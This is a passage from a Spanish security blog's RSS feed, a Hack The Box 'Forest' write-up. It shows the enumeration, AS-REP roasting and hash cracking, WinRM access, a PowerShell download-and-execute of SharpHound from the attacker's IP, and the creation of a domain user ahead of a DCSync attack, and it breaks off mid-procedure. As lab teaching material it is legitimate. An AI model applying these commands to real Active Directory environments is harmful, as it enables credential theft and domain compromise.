<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 11 Oct 2023 18:24:16 -0500</pubDate>
    <lastBuildDate>Wed, 11 Oct 2023 18:24:16 -0500</lastBuildDate>
    <generator>Jekyll v4.3.2</generator>
    
      <item>
        <title>Maquina Forest - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Forest&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad facil, en esta ocasión vamos a enfrentarnos contra un &lt;code&gt;DC&lt;/code&gt; donde enumeraremos usuarios a traves de &lt;code&gt;rpc&lt;/code&gt; y mediante un &lt;code&gt;As-RepRoast attack&lt;/code&gt; solicitando un &lt;code&gt;TGT&lt;/code&gt; obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por &lt;code&gt;winrm&lt;/code&gt; a el equipo; despues enumerando el sistema con &lt;code&gt;Bloodhound&lt;/code&gt; nos aprovecharemos de los permisos del grupo &lt;code&gt;Account Operators&lt;/code&gt; para crear un usuario en el dominio y efectuar un &lt;code&gt;Dcsync attack&lt;/code&gt; donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Forest
❯ ls

 Forest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.161/113.161/113.161/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 11:56 -05
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.161 [65535 ports]
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-09 11:56:58 -05 for 21s
Not shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49934/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
           Raw packets sent: 104093 (4.580MB) | Rcvd: 86582 (3.463MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Nmap 7.93 scan initiated Mon Oct  9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49934/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-10-09T10:06:39-07:00
| smb2-time: 
|   date: 2023-10-09T17:06:35
|_  start_date: 2023-10-09T14:03:53
|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78.92 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;KERBEROS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;NETBIOS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;389&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows Server 2016 Standard&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3268&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto, con &lt;code&gt;crackpamexec&lt;/code&gt; podemos tratar de enumerar a lo que nos enfrentamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;Windows Server 2016&lt;/code&gt; y que el &lt;code&gt;smb&lt;/code&gt; esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.161 htb.local&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora al tratarse de un &lt;code&gt;Domain Controller&lt;/code&gt; podemos tratar de enumerar usuarios validos con &lt;code&gt;rpclient&lt;/code&gt; a traves de un &lt;code&gt;null session&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tenemos un listado potencial de usuarios, podemos tratar de efectuar un &lt;code&gt;ASREProast Attack&lt;/code&gt; para tratar de obtener un &lt;code&gt;TGT - ticket granting ticket&lt;/code&gt; que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py -no-pass -usersfile users htb.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a crackear el hash y obtenemos unas credenciales &lt;code&gt;svc-alfresco:s3rvice&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2023-10-11 14:27) 0.1510g/s 617184p/s 617184c/s 617184C/s s521379846..s3r2s1
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos las credenciales y como el puerto &lt;code&gt;5985&lt;/code&gt; se encuentra abierto podemos tratar de conectarnos por &lt;code&gt;winrm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario &lt;code&gt;svc-alfresco&lt;/code&gt; y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; whoami
htb\svc-alfresco
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; cd ..\Desktop
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; type user.txt
a5bdfec1b06f0a66536a4227d3dfc27d
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como nos enfrentamos a un &lt;code&gt;DC&lt;/code&gt; vamos a usar &lt;code&gt;BloodHound&lt;/code&gt; para tratar de enumerar vias potenciales para elevar nuestros privilegios.&lt;/p&gt;

&lt;p&gt;Para instalarlos solo debemos ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;apt install neo4j, bloodhound -y
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tienes problemas con la instalación puedes instalar una versión especifica de &lt;code&gt;neo4j&lt;/code&gt; de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://debian.neo4j.com/&quot;&gt;https://debian.neo4j.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;y puedes descargar un release de &lt;code&gt;bloodhound&lt;/code&gt; directamente del repositorio de github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;https://github.com/BloodHoundAD/BloodHound/releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez instalado ejecuta el comando &lt;code&gt;neo4j console&lt;/code&gt; y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto &lt;code&gt;neo4j:no4oj&lt;/code&gt; y te pedira cambies la contraseña por defecto a la que desees.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ neo4j console
Starting Neo4j.
2023-10-11 20:21:29.970+0000 INFO  Starting...
2023-10-11 20:21:30.757+0000 INFO  This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)
2023-10-11 20:21:33.391+0000 INFO  ======== Neo4j 4.4.26 ========
2023-10-11 20:21:36.106+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-10-11 20:21:36.659+0000 INFO  Bolt enabled on localhost:7687.
2023-10-11 20:21:37.946+0000 INFO  Remote interface available at http://localhost:7474/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estas credenciales seran la que usaras para logearte al abrir &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora descargaremos el script de powershell &lt;code&gt;sharphound.ps1&lt;/code&gt; que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Subimos el script y lo interpretamos con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; mkdir bloodhound

    Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/11/2023   2:46 PM                bloodhound


Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; cd bloodhound
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/SharpHound.ps1')
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Invoke-BloodHound -CollectionMethod All
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; dir

    Directory: C:\Users\svc-alfresco\Desktop\bloodhound

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/11/2023   2:48 PM          15433 20231011144852_BloodHound.zip
-a----       10/11/2023   2:48 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos traemos el archivo a nuestro equipo y lo importamos en el &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip to 20231011144852_BloodHound.zip
                                        
Info: Download successful!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le asignamos un nombre mas descriptivo al comprimido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 20231011144852_BloodHound.zip   hash   SharpHound.ps1   users
❯ mv 20231011144852_BloodHound.zip bh_data.zip
❯ ls
 bh_data.zip   hash   SharpHound.ps1   users
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora lo subimos al &lt;code&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como comprometimos al usuario &lt;code&gt;svc-alfresco&lt;/code&gt; vamos a marcarlo como comprometido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el usuario alfresco esta dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; y este tiene el privilegio &lt;code&gt;GenericAll&lt;/code&gt; sobre &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;, que a su vez tiene &lt;code&gt;WriteDacl&lt;/code&gt; sobre &lt;code&gt;htb.local&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estando dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle fmiracle123$! /add /domain
The command completed successfully.

Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net group &quot;Exchange Windows Permissions&quot; fmiracle /add
The command completed successfully.
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle
User name                    fmiracle
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/11/2023 3:29:16 PM
Password expires             Never
Password changeable          10/12/2023 3:29:16 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio &lt;code&gt;WriteDacl&lt;/code&gt; y ejecutar un &lt;code&gt;Dcsync Attack&lt;/code&gt;, para ello ejecutamos los siguientes comandos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -Force
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
&lt;/code&gt;&lt;/pre&gt;

